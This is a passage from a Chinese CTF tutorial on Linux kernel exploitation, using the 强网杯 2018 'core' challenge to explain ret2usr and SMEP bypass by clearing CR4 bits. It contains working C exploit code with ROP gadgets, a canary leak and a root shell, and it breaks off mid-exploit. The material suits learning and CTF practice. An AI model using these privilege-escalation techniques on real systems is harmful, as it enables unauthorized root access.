class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET 0xffffffff81000b2f</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MOV_RDI_RAX_CALL_RDX 0xffffffff8101aa6a</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDX_RET 0xffffffff810a0f49</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RCX_RET 0xffffffff81021e53</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_POPFQ_RET 0xffffffff81a012da</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>  IRETQ 0xffffffff813eb448</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="literal">NULL</span>, prepare_kernel_cred = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootPrivilige</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> * (*prepare_kernel_cred_ptr)(<span class="type">void</span> *) = prepare_kernel_cred;</span><br><span class="line">    <span class="type">int</span> (*commit_creds_ptr)(<span class="type">void</span> *) = commit_creds;</span><br><span class="line">    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">if</span>(getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">coreRead</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> * buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setOffValue</span><span class="params">(<span class="type">int</span> fd, <span class="type">size_t</span> off)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889C</span>, off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">coreCopyFunc</span><span class="params">(<span class="type">int</span> fd, <span class="type">size_t</span> nbytes)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889A</span>, nbytes);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> ** argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m\n&quot;</span>);</span><br><span class="line">    saveStatus();</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to open the file: /proc/core !\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//get the addr</span></span><br><span class="line">    FILE* sym_table_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(sym_table_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x50</span>], type[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">size_t</span> addr;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">fscanf</span>(sym_table_fd, <span class="string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, buf))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(prepare_kernel_cred &amp;&amp; commit_creds)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!commit_creds &amp;&amp; !<span class="built_in">strcmp</span>(buf, <span class="string">&quot;commit_creds&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            commit_creds = addr;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the addr of commit_cread:\033[0m%llx\n&quot;</span>, commit_creds);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            prepare_kernel_cred = addr;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the addr of prepare_kernel_cred:\033[0m%llx\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> offset = commit_creds - <span class="number">0xffffffff8109c8e0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get the canary</span></span><br><span class="line">    <span class="type">size_t</span> canary;</span><br><span class="line">    setOffValue(fd, <span class="number">64</span>);</span><br><span class="line">    coreRead(fd, buf);</span><br><span class="line">    canary = ((<span class="type">size_t</span> *)buf)[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//construct the ropchain</span></span><br><span class="line">    <span class="type">size_t</span> rop_chain[<span class="number">0x100</span>], i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(; i &lt; <span class="number">10</span>;i++)</span><br><span class="line">        rop_chain[i] = canary;</span><br><span class="line">    rop_chain[i++] = (<span class="type">size_t</span>)getRootPrivilige;</span><br><span class="line">    rop_chain[i++] = SWAPGS_POPFQ_RET + offset;</span><br><span class="line">    rop_chain[i++] = <span class="number">0</span>;</span><br><span class="line">    rop_chain[i++] = IRETQ + offset;</span><br><span class="line">    rop_chain[i++] = (<span class="type">size_t</span>)getRootShell;</span><br><span class="line">    rop_chain[i++] = user_cs;</span><br><span class="line">    rop_chain[i++] = user_rflags;</span><br><span class="line">    rop_chain[i++] = user_sp;</span><br><span class="line">    rop_chain[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(fd, rop_chain, <span class="number">0x800</span>);</span><br><span class="line">    coreCopyFunc(fd, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>比较一下和常规 ROP 做法的异同。</p><ol><li>通过读取 <code>/tmp/kallsyms</code> 获取 <code>commit_creds</code> 和 <code>prepare_kernel_cred</code> 的方法相同，同时根据这些偏移能确定 gadget 的地址。</li><li>leak canary 的方法也相同，通过控制全局变量 <code>off</code> 读出 canary。</li><li>与 kernel rop 做法不同的是 rop 链的构造<ol><li>kernel rop 通过 内核空间的 rop 链达到执行 <code>commit_creds(prepare_kernel_cred(0))</code> 以提权目的，之后通过 <code>swapgs; iretq</code> 等返回到用户态，执行用户空间的 <code>system(&quot;/bin/sh&quot;)</code> 获取 shell</li><li>ret2usr 做法中，直接返回到用户空间构造的 <code>commit_creds(prepare_kernel_cred(0))</code> （通过函数指针实现）来提权，<u>虽然这两个函数位于内核空间，但此时我们是 <code>ring 0</code> 特权</u>，因此可以正常运行。之后也是通过 <code>swapgs; iretq</code> 返回到用户态来执行用户空间的 <code>system(&quot;/bin/sh&quot;)</code></li></ol></li></ol><p>从这两种做法的比较可以体会出之所以要 <code>ret2usr</code>，是因为一般情况下在用户空间构造特定目的的代码要比在内核空间简单得多。</p><h3 id="KPTI-与-ret2usr"><a href="#KPTI-与-ret2usr" class="headerlink" title="KPTI 与 ret2usr"></a>KPTI 与 ret2usr</h3><p>对于开启了 KPTI 的内核而言，内核页表的用户地址空间无执行权限，因此当内核尝试执行用户空间代码时，由于对应页顶级表项没有设置可执行位，因此会直接 panic，这意味着<strong>实际上 ret2usr 已经是过去式了</strong>。</p><h2 id="bypass-smep"><a href="#bypass-smep" class="headerlink" title="bypass-smep"></a>bypass-smep</h2><h3 id="SMEP"><a href="#SMEP" class="headerlink" title="SMEP"></a>SMEP</h3><p>为了防止 <code>ret2usr</code> 攻击，内核开发者提出了 <code>smep</code> 保护，smep 全称 <code>Supervisor Mode Execution Protection</code>，是内核的一种保护措施，作用是当 CPU 处于 <code>ring0</code> 模式时，执行 <code>用户空间的代码</code> 会触发页错误；这个保护在 arm 中被称为 <code>PXN</code>。</p><p>通过 qemu 启动内核时的选项可以判断是否开启了 smep 保护。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CISCN2017_babydriver [master●●] grep smep ./boot.sh</span><br><span class="line">qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append &#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27; -enable-kvm -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep</span><br></pre></td></tr></table></figure><p>也可以通过</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CISCN2017_babydriver [master●●] grep smep /proc/cpuinfo </span><br><span class="line">flags       : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx pdpe1gb rdtscp lm constant_tsc arch_perfmon pebs bts rep_good nopl xtopology nonstop_tsc cpuid aperfmperf pni pclmulqdq dtes64 monitor ds_cpl vmx est tm2 ssse3 sdbg fma cx16 xtpr pdcm pcid sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand lahf_lm abm 3dnowprefetch cpuid_fault epb invpcid_single pti tpr_shadow vnmi flexpriority ept vpid fsgsbase tsc_adjust bmi1 avx2 smep bmi2 erms invpcid rdseed adx smap intel_pt xsaveopt dtherm ida arat pln pts</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>检测该保护是否开启。</p><h4 id="smep-和-CR4-寄存器"><a href="#smep-和-CR4-寄存器" class="headerlink" title="smep 和 CR4 寄存器"></a>smep 和 CR4 寄存器</h4><p>系统根据 CR4 寄存器的值判断是否开启 smep 保护，当 CR4 寄存器的第 20 位是 1 时，保护开启；是 0 时，保护关闭。</p><p><img src="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/figure/smep.jpg" alt="smep"></p><p>例如，当</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$CR4 = 0x1407f0 = 000 1 0100 0000 0111 1111 0000</span><br></pre></td></tr></table></figure><p>时，smep 保护开启。而 CR4 寄存器是可以通过 mov 指令修改的，因此只需要</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov cr4, 0x1407e0</span><br><span class="line"># 0x1407e0 = 101 0 0000 0011 1111 00000</span><br></pre></td></tr></table></figure><p>即可关闭 smep 保护。</p><p>搜索一下从 <code>vmlinux</code> 中提取出的 gadget，很容易就能达到这个目的。</p><ul><li>如何查看 CR4 寄存器的值？<ul><li>gdb 无法查看 cr4 寄存器的值，可以通过 kernel crash 时的信息查看。为了关闭 smep 保护，常用一个固定值 <strong>0x6f0</strong>，即 <code>mov cr4, 0x6f0</code>。</li></ul></li></ul><h3 id="例题：强网杯-2018-core-1"><a href="#例题：强网杯-2018-core-1" class="headerlink" title="例题：强网杯 2018 - core"></a>例题：强网杯 2018 - core</h3><p>这一次我们在启动脚本中添加上 smep 与 smap 的选项：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 128M \</span><br><span class="line">-cpu qemu64-v1,+smep,+smap \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./rootfs.cpio \</span><br><span class="line">-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \</span><br><span class="line">-s  \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic  \</span><br></pre></td></tr></table></figure><p>之后我们重新运行之前的 ret2usr 的 exp，发现直接 kernel panic 了，这是因为我们想要执行用户空间的函数指针，触发了 SMEP 保护</p><p><img src="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/figure/ret2usr_failed.png" alt="image.png"></p><p>那么这里我们只需要通过 ROP 来关闭 SMEP&amp;SMAP 即可继续 ret2usr，这里笔者用与运算将 SMEP 与 SMAP 的两位给清除掉了，实际上直接给 cr4 赋值 <code>0x6f0</code> 也是可以的（通常关了以后都是这个值）</p><p>前面我们使用 swapgs 和 iret 两条指令来返回用户态，这一次我们直接使用 <code>swapgs_restore_regs_and_return_to_usermode</code> 来返回用户态</p><p>最终的 exp 如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET 0xffffffff81000b2f</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MOV_RDI_RAX_CALL_RDX 0xffffffff8101aa6a</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDX_RET 0xffffffff810a0f49</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RCX_RET 0xffffffff81021e53</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RAX_RET 0xffffffff810520cf</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_POPFQ_RET 0xffffffff81a012da</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MOV_RAX_CR4_ADD_RSP_8_POP_RBP_RET 0xffffffff8106669c</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AND_RAX_RDI_RET 0xffffffff8102b45b</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MOV_CR4_RAX_PUSH_RCX_POPFQ_RET 0xffffffff81002515</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUSHFQ_POP_RBX_RET 0xffffffff81131da4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRETQ 0xffffffff813eb448</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81a008da</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="literal">NULL</span>, prepare_kernel_cred = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * (*prepare_kernel_cred_ptr)(<span class="type">void</span> *);</span><br><span class="line"><span class="type">int</span> (*commit_creds_ptr)(<span class="type">void</span> *);</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootPrivilige</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">if</span>(getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">coreRead</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> * buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setOffValue</span><span class="params">(<span class="type">int</span> fd, <span class="type">size_t</span> off)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889C</span>, off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">coreCopyFunc</span><span class="params">(<span class="type">int</span> fd, <span class="type">size_t</span> nbytes)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889A</span>, nbytes);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> ** argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m\n&quot;</span>);</span><br><span class="line">    saveStatus();</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to open the file: /proc/core !\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//get the addr</span></span><br><span class="line">    FILE* sym_table_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(sym_table_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x50</span>], type[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">size_t</span> addr;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">fscanf</span>(sym_table_fd, <span class="string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, buf))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(prepare_kernel_cred &amp;&amp; commit_creds)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!commit_creds &amp;&amp; !<span class="built_in">strcmp</span>(buf, <span class="string">&quot;commit_creds&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            commit_creds_ptr = commit_creds = addr;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the addr of commit_cread:\033[0m%llx\n&quot;</span>, commit_creds);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            prepare_kernel_cred_ptr = prepare_kernel_cred = addr;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the addr of prepare_kernel_cred:\033[0m%llx\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> offset = commit_creds - <span class="number">0xffffffff8109c8e0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get the canary</span></span><br><span class="line">    <span class="type">size_t</span> canary;</span><br><span class="line">    setOffValue(fd, <span class="number">64</span>);</span><br><span class="line">    coreRead(fd, buf);</span><br><span class="line">    canary = ((<span class="type">size_t</span> *)buf)[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//construct the ropchain</span></span><br><span class="line">    <span class="type">size_t</span> rop_chain[<span class="number">0x100</span>], i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(; i &lt; <span class="number">10</span>;i++)</span><br><span class="line">        rop_chain[i] = canary;</span><br><span class="line"></span><br><span class="line">    rop_chain[i++] = 